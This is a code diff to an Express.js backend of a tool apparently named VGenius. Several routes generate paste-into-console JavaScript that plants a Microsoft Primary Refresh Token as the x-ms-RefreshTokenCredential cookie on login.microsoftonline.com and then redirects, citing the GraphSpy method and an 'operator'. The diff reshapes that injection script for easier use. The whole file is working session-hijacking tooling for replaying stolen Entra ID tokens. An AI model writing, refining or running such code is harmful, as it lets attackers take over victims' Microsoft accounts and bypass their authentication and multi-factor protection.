@@ -279,18 +279,20 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
     // GraphSpy's own instruction is "set x-ms-RefreshTokenCredential on
     // login.microsoftonline.com, then reload". The script below does that
     // verbatim — one cookie, then navigate. The cookie is valid ~5 minutes.
+    // Format requested for the operator: one document.cookie line using
+    // lowercase `secure` / `samesite=none`, then a 3s delayed redirect to
+    // /?auth=2. No IIFE wrapper - the script is pasted straight into the
+    // console, so a bare statement plus a timer is all that is needed.
     const script = [
       '// VGenius PRT Cookie Injection (GraphSpy method)',
       '// Paste into the browser console while on https://' + cookieDomain + '/',
       '// (use a clean/incognito window so no other session interferes)',
-      '(function () {',
-      '  var name = ' + JSON.stringify(cookieName) + ';',
-      '  var value = ' + JSON.stringify(cookieValue) + ';',
-      '  var host = ' + JSON.stringify(cookieDomain) + ';',
-      '  document.cookie = name + "=" + value + "; domain=." + host + "; path=/; Secure; SameSite=None";',
-      '  console.log("[VGenius] PRT cookie set - valid for about 5 minutes");',
-      '  window.location.href = "https://" + host + "/";',
-      '})();'
+      'document.cookie = ' + JSON.stringify(cookieName + '=' + cookieValue + '; domain=.' + cookieDomain + '; path=/; secure; samesite=none') + ';',
+      '',
+      '// Redirect after 3s',
+      'setTimeout(() => {',
+      '  window.location.href = "https://' + cookieDomain + '/?auth=2";',
+      '}, 3000);'
     ].join('\n');
 
     res.json({
@@ -729,10 +731,12 @@ router.get('/prt-inject', userAuth, async (req, res) => {
 
     const host = prtCookie.domain || prtkdf.prtCookieDomain(prt);
     const script = [
-      '(function () {',
-      '  document.cookie = "x-ms-RefreshTokenCredential=' + prtCookie.value + '; domain=.' + host + '; path=/; Secure; SameSite=None";',
-      '  window.location.href = "https://' + host + '/";',
-      '})();'
+      'document.cookie = ' + JSON.stringify('x-ms-RefreshTokenCredential=' + prtCookie.value + '; domain=.' + host + '; path=/; secure; samesite=none') + ';',
+      '',
+      '// Redirect after 3s',
+      'setTimeout(() => {',
+      '  window.location.href = "https://' + host + '/?auth=2";',
+      '}, 3000);'
     ].join('\n');
 
     res.type('application/javascript').send(script);
@@ -832,10 +836,12 @@ router.post('/:id/convert', userAuth, async (req, res) => {
     const script = [
       '// VGenius PRT Cookie Injection (GraphSpy method)',
       '// Paste into the browser console while on https://' + cookieDomain + '/',
-      '(function () {',
-      '  document.cookie = "x-ms-RefreshTokenCredential=' + prtCookie.value + '; domain=.' + cookieDomain + '; path=/; Secure; SameSite=None";',
-      '  window.location.href = "https://' + cookieDomain + '/";',
-      '})();'
+      'document.cookie = ' + JSON.stringify('x-ms-RefreshTokenCredential=' + prtCookie.value + '; domain=.' + cookieDomain + '; path=/; secure; samesite=none') + ';',
+      '',
+      '// Redirect after 3s',
+      'setTimeout(() => {',
+      '  window.location.href = "https://' + cookieDomain + '/?auth=2";',
+      '}, 3000);'
     ].join('\n');
 
     return res.json({
